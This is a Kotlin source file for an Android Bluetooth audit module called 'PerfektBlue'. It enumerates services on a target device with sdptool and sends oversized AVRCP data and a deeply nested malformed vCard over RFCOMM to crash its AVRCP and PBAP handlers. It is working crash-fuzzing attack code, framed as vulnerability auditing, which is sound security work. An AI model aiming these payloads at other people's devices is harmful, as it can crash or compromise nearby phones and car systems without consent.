package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext
import java.io.IOException
import java.util.UUID

/**
 * Module responsible for "PerfektBlue" vulnerability auditing.
 *
 * PerfektBlue targets memory corruption vulnerabilities in Bluetooth stack upper-layer
 * protocols (SDP, AVRCP, PBAP). The audit connects to these profiles and sends
 * malformed data to detect crashes or unexpected disconnections.
 *
 * The module uses both Android Bluetooth APIs (RFCOMM sockets) and root commands
 * (sdptool for service enumeration). If root is unavailable, it falls back to
 * userspace-only RFCOMM probing.
 *
 * All privileged operations are executed through [RootExecutor].
 */
@SuppressLint("MissingPermission")
class PerfektBlueModule(private val context: Context) {

    companion object {
        private const val TAG = "PerfektBlueModule"

        /** AVRCP (Audio/Video Remote Control Profile) UUID */
        private val AVRCP_UUID: UUID = UUID.fromString("0000110e-0000-1000-8000-00805f9b34fb")

        /** PBAP (Phone Book Access Profile) UUID */
        private val PBAP_UUID: UUID = UUID.fromString("0000112f-0000-1000-8000-00805f9b34fb")

        /** Oversized AVRCP metadata payload for buffer overflow testing. */
        private val AVRCP_FUZZ_PAYLOAD = ByteArray(4096) { (it % 256).toByte() }

        /** Malformed vCard with deep nesting for stack exhaustion testing. */
        private val MALFORMED_VCARD: ByteArray = buildMalformedVcard().toByteArray(Charsets.UTF_8)

        private fun buildMalformedVcard(): String {
            val sb = StringBuilder()
            sb.append("BEGIN:VCARD\r\n")
            sb.append("VERSION:3.0\r\n")
            sb.append("FN:")
            // Oversized field name (2048 chars)
            repeat(2048) { sb.append('A') }
            sb.append("\r\n")
            // Deeply nested AGENT properties to trigger stack exhaustion
            repeat(50) {
                sb.append("AGENT:BEGIN:VCARD\\nFN:Nested$it\\n")
            }
            repeat(50) {
                sb.append("END:VCARD\\n")
            }
            sb.append("END:VCARD\r\n")
            return sb.toString()
        }
    }

    /**
     * Starts a vulnerability audit against a target device.
     *
     * The audit flow:
     * 1. Check for root access -- if available, use sdptool for service enumeration
     * 2. Test AVRCP by connecting and sending oversized metadata
     * 3. Test PBAP by connecting and sending malformed vCard data
     * 4. Monitor for IOExceptions (connection drops = potential crash detected)
     *
     * @param targetDevice The device to audit.
     * @return A Flow emitting audit logs.
     */
    fun startAudit(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Initializing PerfektBlue Audit...")
        emit("Target: ${targetDevice.name ?: mac}")

        val hasRoot = RootExecutor.isRootAvailable()
        if (hasRoot) {
            emit("Root access available. Using privileged service enumeration.")
        } else {
            emit("Root not available. Using userspace-only RFCOMM probing.")
        }

        // Phase 1: Service enumeration
        if (hasRoot) {
            emit("--- Phase 1: SDP Service Enumeration (root) ---")
            enumerateServicesViaRoot(mac)
        } else {
            emit("--- Phase 1: Skipping SDP enumeration (no root) ---")
        }

        // Phase 2: AVRCP fuzzing
        emit("--- Phase 2: AVRCP Buffer Overflow Test ---")
        testAvrcpOverflow(mac)

        // Phase 3: PBAP fuzzing
        emit("--- Phase 3: PBAP vCard Parsing Test ---")
        testPbapMalformed(mac)

        emit("PerfektBlue audit complete.")
    }

    /**
     * Uses sdptool via root to browse services on the target device.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.enumerateServicesViaRoot(
        mac: String
    ) {
        emit("Browsing SDP services on $mac via sdptool...")
        val sdpResult = RootExecutor.execute("sdptool browse $mac")

        if (sdpResult.startsWith("Error") || sdpResult.contains("not found")) {
            emit("sdptool browse failed: $sdpResult")
            emit("sdptool may not be installed. Skipping privileged enumeration.")
            return
        }

        // Emit service information
        val services = sdpResult.lines().filter { it.isNotBlank() }
        emit("SDP returned ${services.size} lines of service data:")
        for (line in services.take(30)) { // Cap output to avoid flooding
            emit("  sdp: $line")
        }
        if (services.size > 30) {
            emit("  ... (${services.size - 30} more lines)")
        }
    }

    /**
     * Tests AVRCP by connecting via RFCOMM and sending oversized metadata.
     * An IOException during or after the write may indicate a crash on the target.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.testAvrcpOverflow(
        mac: String
    ) {
        emit("Connecting to AVRCP ($AVRCP_UUID) on $mac...")

        val result = connectAndFuzz(mac, AVRCP_UUID, AVRCP_FUZZ_PAYLOAD, "AVRCP", 5)

        when (result) {
            FuzzResult.CONNECTION_FAILED -> {
                emit("Could not connect to AVRCP. Service may not be exposed.")
            }
            FuzzResult.TARGET_CRASHED -> {
                emit("CRASH DETECTED: Target dropped the AVRCP connection after receiving oversized metadata.")
                emit("Potential buffer overflow / RCE vector in AVRCP metadata handler.")
                Log.w(TAG, "PerfektBlue: Potential AVRCP crash on $mac")
            }
            FuzzResult.TARGET_STABLE -> {
                emit("Target remained stable after AVRCP fuzz payloads. No crash detected.")
            }
            FuzzResult.WRITE_ERROR -> {
                emit("Error writing AVRCP fuzz payload. Connection may have been rejected.")
            }
        }
    }

    /**
     * Tests PBAP by connecting via RFCOMM and sending malformed vCard data.
     * An IOException during or after the write may indicate a crash on the target.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.testPbapMalformed(
        mac: String
    ) {
        emit("Connecting to PBAP ($PBAP_UUID) on $mac...")

        val result = connectAndFuzz(mac, PBAP_UUID, MALFORMED_VCARD, "PBAP", 1)

        when (result) {
            FuzzResult.CONNECTION_FAILED -> {
                emit("Could not connect to PBAP. Service may not be exposed.")
            }
            FuzzResult.TARGET_CRASHED -> {
                emit("CRASH DETECTED: Target dropped the PBAP connection after receiving malformed vCard.")
                emit("Potential RCE vector identified in PBAP vCard parser.")
                Log.w(TAG, "PerfektBlue: Potential PBAP crash on $mac")
            }
            FuzzResult.TARGET_STABLE -> {
                emit("Target remained stable after PBAP malformed vCard. No crash detected.")
            }
            FuzzResult.WRITE_ERROR -> {
                emit("Error writing PBAP fuzz payload. Connection may have been rejected.")
            }
        }
    }

    /**
     * Connects to a service UUID via RFCOMM, sends fuzz payloads, and monitors for crashes.
     *
     * @param mac The target MAC address.
     * @param uuid The service UUID to connect to.
     * @param payload The fuzz payload bytes.
     * @param profileName Human-readable profile name for logging.
     * @param iterations Number of times to send the payload.
     * @return A [FuzzResult] indicating what happened.
     */
    private suspend fun connectAndFuzz(
        mac: String,
        uuid: UUID,
        payload: ByteArray,
        profileName: String,
        iterations: Int
    ): FuzzResult = withContext(Dispatchers.IO) {
        var socket: BluetoothSocket? = null
        try {
            val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
            val adapter = manager?.adapter
            if (adapter == null) {
                Log.e(TAG, "BluetoothAdapter not available")
                return@withContext FuzzResult.CONNECTION_FAILED
            }

            val device: BluetoothDevice = adapter.getRemoteDevice(mac)
            socket = device.createRfcommSocketToServiceRecord(uuid)
            socket.connect()
            Log.d(TAG, "Connected to $profileName on $mac")

            val os = socket.outputStream
            val iStream = socket.inputStream

            // Send fuzz payloads
            for (i in 1..iterations) {
                try {
                    os.write(payload)
                    os.flush()
                    Log.d(TAG, "Sent $profileName fuzz packet $i/$iterations (${payload.size} bytes)")
                } catch (e: IOException) {
                    // Write failure mid-stream likely means the target dropped the connection
                    Log.w(TAG, "$profileName connection dropped during write $i/$iterations", e)
                    return@withContext FuzzResult.TARGET_CRASHED
                }
            }

            // After sending, do a blocking read with a timeout to detect crashes.
            // BluetoothSocket does not support soTimeout, so we use a reader thread
            // with a join timeout. If the read completes with EOF (-1) or throws
            // IOException, the target likely crashed. If the thread times out
            // (still blocking on read), the connection is alive and the target is stable.
            var readResult: Int? = null
            var readException: IOException? = null
            val readThread = Thread {
                try {
                    readResult = iStream.read()
                } catch (e: IOException) {
                    readException = e
                }
            }
            readThread.start()
            readThread.join(1000)

            if (readThread.isAlive) {
                // Timed out waiting for data -- connection still alive, target is stable
                readThread.interrupt()
                FuzzResult.TARGET_STABLE
            } else if (readException != null) {
                Log.w(TAG, "$profileName connection dropped after payloads", readException)
                FuzzResult.TARGET_CRASHED
            } else if (readResult == -1) {
                // EOF: target closed the connection
                Log.w(TAG, "$profileName connection EOF after payloads")
                FuzzResult.TARGET_CRASHED
            } else {
                FuzzResult.TARGET_STABLE
            }
        } catch (e: IOException) {
            Log.d(TAG, "Could not connect to $profileName on $mac: ${e.message}")
            FuzzResult.CONNECTION_FAILED
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied connecting to $profileName on $mac", e)
            FuzzResult.CONNECTION_FAILED
        } catch (e: IllegalArgumentException) {
            Log.e(TAG, "Invalid MAC address: $mac", e)
            FuzzResult.CONNECTION_FAILED
        } finally {
            try {
                socket?.close()
            } catch (_: IOException) { }
        }
    }

    /** Result categories for a fuzz test against a Bluetooth profile. */
    private enum class FuzzResult {
        /** Could not establish the RFCOMM connection to the profile. */
        CONNECTION_FAILED,
        /** The target dropped the connection, suggesting a crash or buffer overflow. */
        TARGET_CRASHED,
        /** The target accepted all payloads and the connection remained stable. */
        TARGET_STABLE,
        /** An error occurred writing the payload (distinct from a post-write crash). */
        WRITE_ERROR
    }
}
